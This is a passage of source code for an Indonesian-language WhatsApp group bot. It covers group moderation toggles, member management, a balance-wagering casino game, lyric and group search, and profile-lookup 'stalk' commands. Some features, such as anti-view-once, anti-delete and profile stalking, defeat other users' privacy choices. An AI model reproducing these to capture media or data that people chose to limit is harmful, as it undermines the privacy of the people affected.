}
break
case 'autoaigrup':case "aigrup": case 'autoaigc':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return newReply(`Udah aktif`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
newReply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return newReply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
newReply('Successfully Disabling Auto AI')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autoaijapri':case "aipc": case 'autoaipc':{
if (m.isGroup) return newReply('Fitur Khusus Japri!')
if (!isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autoaijapri', m.sender, _cmd)
if (isAutoAiPc) return newReply(`Udah aktif`)
openaipc.push(botNumber)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
newReply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaijapri', m.sender, _cmd)
if (!isAutoAiPc) return newReply(`Udah nonaktif`)
let anu = openaipc.indexOf(botNumber)
openaipc.splice(anu, 1)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
newReply('Successfully Disabling Auto AI')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'antilink':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antilink', m.sender, _cmd)
if (isAntiLink) return newReply(`Udah aktif`)
antilink.push(m.chat)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
newReply('Successfully Activate Antilink In This Group')
} else if (args[0] === "off") {
addCountCmd('#antilink', m.sender, _cmd)
if (!isAntiLink) return newReply(`Udah nonaktif`)
let anu = antilink.indexOf(m.chat)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
newReply('Successfully Disabling Antilink In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'antilinktt':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antilink2', m.sender, _cmd)
if (isAntiLink2) return newReply(`Udah aktif`)
antilink2.push(m.chat)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
newReply('Successfully Activate antilink2 In This Group')
} else if (args[0] === "off") {
addCountCmd('#antilink2', m.sender, _cmd)
if (!isAntiLink2) return newReply(`Udah nonaktif`)
let anu = antilink2.indexOf(m.chat)
antilink2.splice(anu, 1)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
newReply('Successfully Disabling antilink2 In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'kickme':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#kickme', m.sender, _cmd)
if (isKickMe) return newReply(`Udah aktif`)
kickme.push(m.chat)
fs.writeFileSync('./database/kickme.json', JSON.stringify(kickme, null, 2))
newReply('Successfully Activate Kickme In This Group')
} else if (args[0] === "off") {
addCountCmd('#kickme', m.sender, _cmd)
if (!isKickMe) return newReply(`Udah nonaktif`)
let anu = kickme.indexOf(m.chat)
kickme.splice(anu, 1)
fs.writeFileSync('./database/kickme.json', JSON.stringify(kickme, null, 2))
newReply('Successfully Disabling Kickme In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'mute':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return newReply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
newReply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return newReply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
newReply('Successfully Unmute In This Group')
}else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'antidelete':{
// if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
//if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antidelete', m.sender, _cmd)
if (setting.antiDelete) return newReply(`Udah aktif`)
setting.antiDelete = true
newReply('Successfully Activate antidelete In This bot')
} else if (args[0] === "off") {
addCountCmd('#antidelete', m.sender, _cmd)
if (!setting.antiDelete) return newReply(`Udah nonaktif`)
setting.antiDelete = false
newReply('Successfully Disabling antidelete In This bot')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
}
break
case 'antionce':case 'antivo': case 'antiviewonce':{
// if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
// if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antionce', m.sender, _cmd)
if (setting.antiViewOnce) return newReply(`Udah aktif`)
setting.antiViewOnce = true
newReply('Successfully Activate Anti view once In This bot')
} else if (args[0] === "off") {
addCountCmd('#antionce', m.sender, _cmd)
if (!setting.antiViewOnce) return newReply(`Udah nonaktif`)
setting.antiViewOnce = false
newReply('Successfully Disabling Anti view once In This bot')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
}
break
case 'antiwame':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
 if (args[0] === "on") {
addCountCmd('#antiwame', m.sender, _cmd)
if (isAntiWame) return newReply(`Udah aktif`)
antiwame.push(m.chat)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
newReply('Successfully Activate Antiwame In This Group')
} else if (args[0] === "off") {
addCountCmd('#antiwame', m.sender, _cmd)
if (!isAntiWame) return newReply(`Udah nonaktif`)
let anu = antiwame.indexOf(m.chat)
antiwame.splice(anu, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
newReply('Successfully Disabling Antiwame In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'antiwame2':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
 if (args[0] === "on") {
addCountCmd('#antiwame2', m.sender, _cmd)
if (isAntiWame2) return newReply(`Udah aktif`)
antilink.push(m.chat)
fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
newReply('Successfully Activate antiwame2 In This Group')
} else if (args[0] === "off") {
addCountCmd('#antiwame2', m.sender, _cmd)
if (!isAntiWame2) return newReply(`Udah nonaktif`)
let anu = antiwame2.indexOf(m.chat)
antiwame2.splice(anu, 1)
fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
newReply('Successfully Disabling antiwame2 In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'opentime': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Lu Siapa Kocak')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return newReply('*Pilih:*\ndetik\nmenit\njam\n\n*Example*\n10 detik')
}
newReply(`Grup Akan Dibuka Dalam ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `Grup Telah Di Buka Oleh Admin\nSekarang Semua Member Dapat Mengirim Pesan`
Aira.groupSettingUpdate(m.chat, 'not_announcement')
newReply(open)
}, timer)
}
break
case 'open': case 'buka':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
addCountCmd('#group', m.sender, _cmd)
Aira.groupSettingUpdate(m.chat, 'not_announcement')
const textOpen = await getTextSetOpen(m.chat, set_open);
newReply(textOpen || `Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
break
}
case 'setopen':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) return newReply(`Set open sudah ada sebelumnya`)
addSetOpen(text, m.chat, set_open)
addCountCmd('#setopen', m.sender, _cmd)
newReply(`✅ Done set open!`)
}
break
case 'changeopen': case 'changesetopen':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) {
addCountCmd('#changeopen', m.sender, _cmd)
changeSetOpen(text, m.chat, set_open)
newReply(`Sukses ubah set open teks!`)
} else {
addCountCmd('#changeopen', m.sender, _cmd)
addSetOpen(text, m.chat, set_open)
newReply(`Sukses ubah set open teks!`)
}
break
case 'delsetopen':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!isSetOpen(m.chat, set_open)) return newReply(`Belum ada set open di sini..`)
removeSetOpen(m.chat, set_open)
addCountCmd('#delsetopen', m.sender, _cmd)
newReply(`Sukses delete set open`)
break
case 'closetime': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Lu Siapa Kocak')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'harj') {
var timer = args[0] * `86400000`
} else {
return newReply('*Pilih:*\ndetik\nmenit\njam\n\n*Example*\n10 detik')
}
newReply(`Group Akan Ditutup Dalam ${q} Di Mulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `Grup Di Tutup Oleh Admin\nSekarang Hanya Admin Yang Dapat Mengirim Pesan`
Aira.groupSettingUpdate(m.chat, 'announcement')
newReply(close)
}, timer)
}
break
case 'close': case 'tutup':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
addCountCmd('#close', m.sender, _cmd)
Aira.groupSettingUpdate(m.chat, 'announcement')
const textClose = await getTextSetClose(m.chat, set_close);
newReply(textClose || `Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)}
break
case 'setclose':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) return newReply(`Set close sudah ada sebelumnya`)
addSetClose(text, m.chat, set_close)
addCountCmd('#setclose', m.sender, _cmd)
newReply(`✅ Done set close!`)
}
break
case 'changeclose': case 'changesetclose':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) {
addCountCmd('#changeclose', m.sender, _cmd)
changeSetClose(text, m.chat, set_close)
newReply(`Sukses ubah set close teks!`)
} else {
addCountCmd('#changeclose', m.sender, _cmd)
addSetClose(text, m.chat, set_close)
newReply(`Sukses ubah set close teks!`)
}}
break
case 'delsetclose':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!isSetClose(m.chat, set_close)) return newReply(`Belum ada set close di sini..`)
removeSetClose(m.chat, set_close)
addCountCmd('#delsetclose', m.sender, _cmd)
newReply(`Sukses delete set close`)}
break
case 'kick': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Aira.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => newReply('Sukses kick target✅')).catch((err) => newReply('Tag/reply pesan target yang ingin di kick!'))
}
break
case 'add': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Aira.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => newReply('Sukses add member✅')).catch((err) => newReply('❌ Terjadi kesalahan, mungkin nmr nya privat'))
}
break
case 'promote': case 'pm': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Aira.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => newReply('Sukses promote member✅')).catch((err) => newReply('❌ Terjadi kesalahan'))
}
break
case 'demote': case 'dm': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Aira.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => newReply('Sukses demote admin✅')).catch((err) => newReply('❌ Terjadi kesalahan'))
}
break
case 'revoke':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
addCountCmd('#revoke', m.sender, _cmd)
await Aira.groupRevokeInvite(m.chat)
.then( res => {
newReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => newReply(mess.error.api))}
break
case 'tagall': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Lu siapa kocak?')
if (!isBotAdmins) return newReply ('Bot Harus Jad Admin!') 
let teks = `*👥 Tag All By Admin*
 
🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `• @${mem.id.split('@')[0]}\n`
}
Aira.sendMessage(m.chat, {
text: teks,
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
break
case 'hidetag': case 'h': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Lu siapa kocak?')
Aira.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fkontak })
}
break
case 'delete': case 'd': case 'del': {
if (!m.quoted) throw false
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Aira.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'checksewa': case 'ceksewa': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isSewa) return newReply(`Bot tidak di sewa group ini!`)
addCountCmd('#checksewa', m.sender, _cmd)
let ceksewa = ms(_sewa.getSewaExpired(m.chat, sewa) - Date.now())
let sewanya = `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s)`
newReply(sewanya)
}
break
// Game Menu
case 'ttc': case 'ttt': case 'tictactoe': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return newReply( 'Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
newReply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await Aira.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Aira.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
newReply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${prefix+command} ${text}` : ''))
this.game[room.id] = room
}
}
break
case 'delttc': case 'delttt': {
let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) return newReply ( `Kamu sedang tidak berada di room tictactoe !`)
delete this.game[roomnya.id]
newReply(`Berhasil delete session room tictactoe !`)
}
break
case 'casino':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (isGame(m.sender, isCreator, gcount, glimit)) return newReply(`Limit game kamu sudah habis`)
if (!text) return newReply(`Kirim perintah *${prefix+command}* @tag nominal`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (fs.existsSync(`./database/${m.chat}.json`)) return newReply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delcasino*, untuk menghapus sesi`)
if (!args[1]) return newReply('Masukan Nominal Nya')
if (args[1].includes('-')) return newReply(`Jangan menggunakan -`)
if (isNaN(parseInt(args[1]))) return newReply('Nominal Harus Berupa Angka!')
var anu = getBalance(m.sender, balance)
var ani = getBalance(m.mentionedJid[0], balance)
if (anu < args[1] || anu == 'undefined') return newReply(`Balance Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
if (ani < args[1] || ani == 'undefined') return newReply(`Balance Lawan Tidak Mencukupi Untuk Bermain Denganmu\nKetik ${prefix}balance @tag untuk mengecek Balance lawanmu`)
var casinoo = setCasino(`${m.chat}`)
casinoo.Z = m.sender.replace("@s.whatsapp.net", "")
casinoo.Y = users
casinoo.nominal = parseInt(args[1])
addCountCmd('#casino', m.sender, _cmd)
fs.writeFileSync(`./database/casino/${m.chat}.json`, JSON.stringify(casinoo, null, 2))
gameAdd(m.sender, glimit)
var starGame = `🎰 Memulai Game Casino 💰\n\n• @${m.sender.replace("@s.whatsapp.net", "")} Menantang ${text}, dengan Nominal: *$ ${parseInt(args[1])}*\n• Ketik Y/N untuk menerima atau menolak Permainan!`
Aira.sendMessage(m.chat, { text: starGame, mentions: [m.sender, users] }, { quoted: m })
}
 break
case 'delcasino':{
if (fs.existsSync('./database/casino/'+m.chat+'.json')) {
var csn = JSON.parse(fs.readFileSync('./database/casino/'+m.chat+'.json'))
if (csn.Z.includes(m.sender)) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else if (csn.Y.includes(m.sender)) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else if (isAdmins) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else if (isCreator) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else {
newReply('Anda tidak bisa menghapus sesi casino, karena bukan pemain!')
}
} else {
newReply('Tidak ada sesi yang berlangsung')
}}
break
// Search Menu
case 'lirik': case 'liriklagu':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *judul*\n\n_Contoh_\n\n${prefix+command} Bila Nanti`)
newReply(mess.wait)
addCountCmd('#lirik', m.sender, _cmd)
try{
let anu = await fetchJson('http://song-lyrics-api-o0m8tth8t-azharimm.vercel.app/search?q=' + text)
if(!anu.data) return newReply('server eror')
limitAdd(m.sender, limit)
let anuu = await fetchJson (anu.data[0].songLyrics)
let { artist, songTitle, songLyrics} = anuu.data
newReply('*Artis:* ' + artist + '\n*Title*: ' + songTitle + '\n*Lirik*: ' + songLyrics)
}catch (error) {
newReply(`Lirik Lagu Tidak Ditemukan`);
}
limitAdd(m.sender, limit)
}
break
case 'grupwa': case 'searchgrup':{
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *nama group*\n\n_Contoh_\n\n${prefix+command} store`)
newReply(mess.wait)
addCountCmd('#grupwa', m.sender, _cmd)
hxz.linkwa(q).then(async(data) => {
if (data.length == 0) return newReply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
}
newReply(teks)
limitAdd(m.sender, limit)
}).catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
newReply(`Hasil pencarian dari ${q} tidak ditemukan`)

})}
break
/*case 'wastalk': case 'stalkwa':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let num = m.quoted?.sender || m.mentionedJid?.[0] || text
	if (!num) throw `Ex: ${usedPrefix + cmd} @tag / 628xxx`
	num = num.replace(/\D/g, '') + '@s.whatsapp.net'
	if (!(await Aira.onWhatsApp(num))[0]?.exists) throw 'User not exists'
	let img = await Aira.profilePictureUrl(num, 'image').catch(_ => 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg')
	let bio = await Aira.fetchStatus(num).catch(_ => { })
	let name = await Aira.getName(num)
	let business = await Aira.getBusinessProfile(num)
	let PhoneNum = require('awesome-phonenumber')
	let format = PhoneNum(`+${num.split('@')[0]}`)
	let country = regionNames.of(format.getRegionCode('international'))
	let wea = `\t\t\t\t*▾ WHATSAPP ▾*\n\n*° Country :* ${country.toUpperCase()}\n*° Name :* ${name ? name : '-'}\n*° Format Number :* ${format.getNumber('international')}\n*° Url Api :* wa.me/${num.split('@')[0]}\n*° Mentions :* @${num.split('@')[0]}\n*° Status :* ${bio?.status || '-'}\n*° Date Status :* ${bio?.setAt ? moment(bio.setAt.toDateString()).locale('id').format('LL') : '-'}\n\n${business ? `\t\t\t\t*▾ INFO BUSINESS ▾*\n\n*° BusinessId :* ${business.wid}\n*° Website :* ${business.website ? business.website : '-'}\n*° Email :* ${business.email ? business.email : '-'}\n*° Category :* ${business.category}\n*° Address :* ${business.address ? business.address : '-'}\n*° Timeone :* ${business.business_hours.timezone ? business.business_hours.timezone : '-'}\n*° Descripcion* : ${business.description ? business.description : '-'}` : '*Standard WhatsApp Account*'}`
	img ? await Aira.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: m }) : m.reply(wea)

}
break*/
case 'ffstalk': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Example: ${prefix+command} id`)
newReply(mess.wait)
let eeh = await rapid.ffstalk(`${q}`)
newReply(`
Game : FreeFire
Id : ${eeh.userId}
Nickname : ${eeh.username}`)
}
break
case 'mlstalk': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Example: ${prefix+command} id|server`)
newReply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
newReply(`Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'igstalk':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Example: ${prefix+command} nickname`)
newReply(mess.wait)
let anu = await fetchJson(`https://skizo.tech/api/igstalk?user=${q}&apikey=${setting.XznKey}`)
const nick = anu.username
const nama = anu.fullname
const post = anu.posts
const foll = anu.followers
const foli = anu.following
const bio = anu.bio
Aira.sendMessage(m.chat, { image: { url: anu.photo_profile}, caption: `Nickname : ${nick}\nFullname : ${nama}\nTotal Postingan : ${post}\nFollowers : ${foll}\nFollowing : ${foli}\nBio : ${bio}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break

case 'igstalk2':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Example: ${prefix+command} nickname`)
newReply(mess.wait)
const getUser=require('./lib/instagram.js')
let anu = await getUser.getUser(text)
const hasill= `\t\t*INFO AKUN*\nusername : ${anu.username}\nfullname : ${anu.fullname}\nuser id : ${anu.id}\nbio : ${anu.biography}\nfollower : ${anu.subscribersCount}\nfollowing : ${anu.subscribtions}\nakun bisnis? : ${anu.isBussinesAccount}\nakun verified? : ${anu.Verified}\nakun private? : ${anu.isPrivate}\n ketegori akun : ${anu.accountCategory}\nrecent user : ${anu.isRecentUser}\npage facebook : ${anu.linkedFacebookPage}\ntotal reels : ${anu.highlighCount}\ntotal postingan : ${anu.postsCount}\n\n postingan : ${anu.posts}\n `
console.log(hasill)
console.log(anu)
Aira.sendMessage(m.chat, { image: { url: anu.profilPicHD}, caption: hasill}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'qrcode': case 'toqr':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
newReply(mess.wait)
let { toDataURL } = require('qrcode')
let hasilll = await Base64ToImage(await toDataURL(text.slice(0, 2048), { scale: 8 }),'qr.png')
Aira.sendMessage(m.chat, { image: fs.readFileSync(hasilll) , caption: `qrcode dari ${text}`}, { quoted: m })
fs.unlinkSync('qr.png')
}
limitAdd(m.sender, limit)
break
case 'pinterest': case 'pin':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
newReply(`Silahkan ditunggu, jika bot tidak mengirimkan foto silahkan diulang command tersebut`)
async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: Aira.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
